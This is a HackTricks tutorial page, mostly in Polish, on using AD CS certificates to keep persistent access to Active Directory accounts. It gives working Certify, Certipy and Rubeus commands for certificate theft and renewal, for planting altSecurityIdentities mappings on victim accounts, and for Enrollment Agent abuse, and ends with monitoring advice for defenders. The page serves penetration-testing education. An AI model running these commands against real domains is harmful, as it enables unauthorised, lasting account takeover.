# Trwałość kont w AD CS

{{#include ../../../banners/hacktricks-training.md}}

**To krótkie podsumowanie rozdziałów dotyczących utrzymywania kont z doskonałych badań z [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Zrozumienie kradzieży poświadczeń aktywnego użytkownika za pomocą certyfikatów – PERSIST1

W scenariuszu, w którym użytkownik może zażądać certyfikatu umożliwiającego uwierzytelnianie w domenie, atakujący ma możliwość zażądania i kradzieży tego certyfikatu, aby utrzymać trwałość w sieci. Domyślnie szablon `User` w Active Directory pozwala na takie żądania, chociaż czasami może być on wyłączony.

Używając [Certify](https://github.com/GhostPack/Certify) lub [Certipy](https://github.com/ly4k/Certipy), możesz wyszukać włączone szablony, które pozwalają na uwierzytelnianie klienta, a następnie zażądać jednego:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Moc certyfikatu polega na zdolności do uwierzytelniania się jako użytkownik, do którego należy, niezależnie od zmian hasła, o ile certyfikat pozostaje ważny.

Możesz przekonwertować PEM na PFX i użyć go, aby uzyskać TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Uwaga: W połączeniu z innymi technikami (zob. sekcje THEFT), uwierzytelnianie oparte na certyfikatach pozwala na trwały dostęp bez ingerencji w LSASS, a nawet z kontekstów nieuprzywilejowanych.

## Uzyskiwanie trwałości na maszynie przy użyciu certyfikatów - PERSIST2

Jeśli atakujący ma podwyższone uprawnienia na hoście, może zarejestrować konto komputera skompromitowanego systemu w celu uzyskania certyfikatu, używając domyślnego szablonu `Machine`. Uwierzytelnianie jako komputer umożliwia S4U2Self dla lokalnych usług i może zapewnić trwałe utrzymanie dostępu na hoście:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Rozszerzanie Persistence poprzez odnowienie certyfikatu - PERSIST3

Nadużywanie okresów ważności i odnowienia szablonów certyfikatów pozwala atakującemu utrzymać dostęp na długi czas. Jeśli posiadasz wcześniej wydany certyfikat i jego klucz prywatny, możesz odnowić go przed wygaśnięciem, aby uzyskać nowe, długotrwałe poświadczenie bez pozostawiania dodatkowych artefaktów żądania powiązanych z oryginalnym podmiotem.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Wskazówka operacyjna: Śledź czasy ważności plików PFX posiadanych przez atakującego i odnawiaj je wcześniej. Odnowienie może także spowodować, że zaktualizowane certyfikaty będą zawierać nowoczesne rozszerzenie mapowania SID, dzięki czemu pozostaną użyteczne przy surowszych regułach mapowania DC (zobacz następną sekcję).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

Jeśli możesz zapisywać do atrybutu `altSecurityIdentities` konta docelowego, możesz jawnie zmapować certyfikat kontrolowany przez atakującego do tego konta. To utrzymuje się pomimo zmian hasła i, przy użyciu silnych formatów mapowania, pozostaje funkcjonalne przy współczesnym egzekwowaniu przez DC.

High-level flow:

1. Obtain or issue a client-auth certificate you control (e.g., enroll `User` template as yourself).
2. Extract a strong identifier from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Add an explicit mapping on the victim principal’s `altSecurityIdentities` using that identifier.
4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Następnie uwierzytelnij się przy użyciu swojego PFX. Certipy bezpośrednio uzyska TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Budowanie silnych mapowań `altSecurityIdentities`

W praktyce mapowania **Issuer+Serial** i **SKI** są najłatwiejszymi silnymi formatami do zbudowania na podstawie certyfikatu kontrolowanego przez atakującego. Ma to znaczenie po **11 lutego 2025**, kiedy DCs domyślnie przejdą na **Full Enforcement** i słabe mapowania przestaną być niezawodne.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Uwagi
- Używaj tylko silnych typów mapowania: `X509IssuerSerialNumber`, `X509SKI`, lub `X509SHA1PublicKey`. Słabe formaty (Subject/Issuer, Subject-only, RFC822 email) są przestarzałe i mogą być zablokowane przez politykę DC.
- Mapowanie działa zarówno na obiektach **user**, jak i **computer**, więc dostęp do zapisu w `altSecurityIdentities` konta komputera wystarczy, by utrzymać trwałość jako ta maszyna.
- Łańcuch certyfikatów musi zostać zbudowany do rootu zaufanego przez DC. Enterprise CAs w NTAuth są zazwyczaj zaufane; niektóre środowiska ufają także publicznym CAs.
- Uwierzytelnianie Schannel pozostaje przydatne do utrzymywania trwałości nawet gdy PKINIT zawiedzie, ponieważ DC nie ma EKU Smart Card Logon lub zwraca `KDC_ERR_PADATA_TYPE_NOSUPP`.

Aby dowiedzieć się więcej o słabych jawnych mapowaniach i ścieżkach ataku, zobacz:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent jako trwałość – PERSIST5

Jeśli zdobędziesz ważny certyfikat Certificate Request Agent/Enrollment Agent, możesz tworzyć nowe certyfikaty umożliwiające logowanie w imieniu użytkowników wedle uznania i przechowywać PFX agenta offline jako token trwałości. Przebieg nadużycia:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Unieważnienie certyfikatu agenta lub uprawnień do szablonu jest wymagane, aby usunąć tę persistence.

Operational notes
- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account.
- If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 introduced Strong Certificate Mapping Enforcement on domain controllers. Since February 11, 2025, DCs default to Full Enforcement, rejecting weak/ambiguous mappings. Practical implications:

- Pre-2022 certificates that lack the SID mapping extension may fail implicit mapping when DCs are in Full Enforcement. Attackers can maintain access by either renewing certificates through AD CS (to obtain the SID extension) or by planting a strong explicit mapping in `altSecurityIdentities` (PERSIST4).
- Explicit mappings using strong formats (Issuer+Serial, SKI, SHA1-PublicKey) continue to work. Weak formats (Issuer/Subject, Subject-only, RFC822) can be blocked and should be avoided for persistence.

Administrators should monitor and alert on:
- Changes to `altSecurityIdentities` and issuance/renewals of Enrollment Agent and User certificates.
- CA issuance logs for on-behalf-of requests and unusual renewal patterns.

## References

- Microsoft. KB5014754: Zmiany w uwierzytelnianiu opartym na certyfikatach na kontrolerach domeny Windows (harmonogram egzekwowania i silne mapowania).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Uwierzytelnianie za pomocą certyfikatów, gdy PKINIT nie jest obsługiwane.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
